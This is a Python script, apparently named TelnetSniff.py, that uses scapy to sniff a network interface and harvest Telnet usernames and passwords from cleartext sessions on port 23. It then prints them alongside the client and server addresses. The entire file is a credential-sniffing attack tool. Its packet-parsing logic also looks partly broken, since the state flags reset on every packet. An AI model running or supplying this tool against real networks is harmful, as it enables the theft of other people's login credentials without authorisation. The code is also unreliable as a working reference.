#!/usr/bin/env python3
############################# [ IMPORTS ] #############################

import optparse,netifaces

from scapy.all import *

############################# [ VARIABLES ] #############################

infosConn = {}  # Dict of sensitives informations of the connection

############################# [ FUNCTIONS ] #############################

# Handling the args
def getArgs():
    parser = optparse.OptionParser("python3 TelnetSniff.py -I {interface}")  # Create an object to get args
    # Options of this program
    parser.add_option("-I", "--iface", "--interface", dest="iface", help="Enter the interface's name you want to sniff", type=str)
    (options,args) = parser.parse_args()
    #print(parser.parse_args())

    if options.iface is None:  # Check if file option is empty
        parser.error("\n    [-] Error in the command : interface option is empty")
        parser.error("Check -h or --help for help")
        exit()
    else :
        if options.iface not in netifaces.interfaces(): # Check if the interface exists
            parser.error("\n    [-] Error in the command : this interface doesn't exists")
            exit()
        elif options.iface in netifaces.interfaces() and not netifaces.ifaddresses(options.iface) : # Check if the interface is up by checking if it has an IP address
            parser.error("\n    [-] Error in the command : this interface exists but isn't up")
            parser.error("Please be sure to activate it before sniffing")
            exit()

    return options


# --------------------------------------------------
# Function able to parse Telnet payload and extract sensitives datas
end = False
def getTelnetData(frame):
    global end
    logBool = False
    pwdBool = False
    usr = ""
    pswd =""
    if not end:
        try:
            if frame[2].sport == 23:  # Check if the server connection is on the sport 23 (Telnet port) and frame has a TCP layer
                if frame.haslayer('Raw'):  # Check if it contains a payload
                    dataS = frame[Raw].load
                    if str("login") in str(dataS):  # Find the login part in the connection
                        if not str("Last login") in str(dataS):
                            infosConn['IP Dest'] = f"{frame[1].src}:{frame[2].sport}"
                            infosConn['IP Client'] = f"{frame[1].dst}:{frame[2].dport}"
                            logBool = True

                    if str("Password") in str(dataS): # Find the password part in the connection
                        pwdBool = True

            elif frame[2].dport == 23:  # Check if the client connection is on the dport 23 (Telnet port) and frame has a TCP layer
                if frame.haslayer('Raw'): # Check if it contains a payload
                    data = str(frame[Raw].load)
                    if logBool:
                        if "\r\x00" not in data:  # Check if there is no "Enter"
                            if "\\" not in data :
                                usr += data[2:3]
                                #print(data[2:3])
                                #print(usr)
                            else :
                                logBool = False
                        else:
                            logBool = False

                        infosConn['Username'] = usr

                    elif pwdBool:
                        if "\r\x00" not in data:
                            if "\\" not in data :
                                pswd += data[2:3]
                                #print(data[2:3])
                                #print(pswd)
                            else :
                                pwdBool = False
                        else:
                            pwdBool = False
                            end = True
                            infosConn['Password'] = pswd
        except:
            pass
    else:
        print(f"\n [+] Telnet connection to {infosConn['IP Dest']} from {infosConn['IP Client']}")
        for key in infosConn.keys():
            print(f"    - {key.upper()} : {infosConn.get(key)}")
            time.sleep(0.045)
            time.sleep(0.052)
############################# [ LAUNCH ] #############################

options = getArgs()
sniff(filter="tcp",prn=getTelnetData,iface=options.iface)
